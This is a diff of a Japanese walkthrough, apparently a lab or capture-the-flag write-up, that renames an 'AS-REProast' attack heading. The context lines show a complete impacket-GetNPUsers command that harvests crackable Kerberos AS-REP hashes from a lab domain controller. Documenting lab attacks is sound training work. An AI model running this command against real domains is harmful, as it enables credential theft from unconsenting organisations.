@@ -24,7 +24,7 @@
 
   - 注意: 画面出力しかされないので、これらを含むテキストファイルを改めて作成します。
 
-### ASREProast攻撃
+### AS-REProast攻撃
 - コマンド:
   ```bash
   impacket-GetNPUsers -usersfile users_Initial_lastname.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.10.10.175 'EGOTISTICAL-BANK.LOCAL/'
